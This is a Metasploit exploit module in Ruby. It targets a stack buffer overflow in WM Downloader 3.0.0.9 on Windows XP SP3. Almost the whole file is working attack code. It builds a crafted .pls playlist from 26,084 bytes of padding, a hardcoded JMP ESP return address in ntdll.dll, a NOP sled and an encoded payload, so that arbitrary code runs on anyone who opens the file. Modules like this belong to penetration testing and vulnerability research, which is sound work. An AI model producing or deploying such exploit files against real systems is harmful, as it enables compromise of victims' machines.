##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking

    include Msf::Exploit::FILEFORMAT

    def initialize(info = {})
        super(update_info(info,
            'Name' => 'WM Downloader Buffer Overflow Exploit',
            'Description' => %q{
                This module exploits a stack overflow in WM Downloader
version 3.0.0.9.
            By creating a specially crafted .pls file, an an attacker may be
able
            to execute arbitrary code.
            },
            'License' => MSF_LICENSE,
            'Author' =>
                [
                    'Blake',
                ],
            'Version' => '$Revision: 1 $',
            'References' =>
                [
                    [ 'OSVDB', '62614' ],
                    [ 'URL', 'http://www.exploit-db.com/exploits/11384' ],
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'thread',
                },
            'Payload' =>
                {
                    'Space' => 1904,
                    'BadChars' => "\x00\x0a\x0d\x20",
                    'StackAdjustment' => -3500,
                },
            'Platform' => 'win',
            'Targets' =>
                [
                    [ 'Windows XP SP3', { 'Ret' => 0x7C96BF33} ],         #
ntdll.dll JMP ESP
                ],
            'Privileged' => false,
            'DisclosureDate' => 'Feb 10 2010',
            'DefaultTarget' => 0))

        register_options(
            [
                OptString.new('FILENAME', [ false, 'The file name.',
'exploit.pls']),
            ], self.class)
    end


    def exploit

        sploit = rand_text_alphanumeric(26084)
        sploit << [target.ret].pack('V')
        sploit << make_nops(20)
        sploit << payload.encoded
        sploit << rand_text_alphanumeric(28000 - payload.encoded.length)

        print_status("Creating '#{datastore['FILENAME']}' file ...")
        file_create(sploit)

    end

end

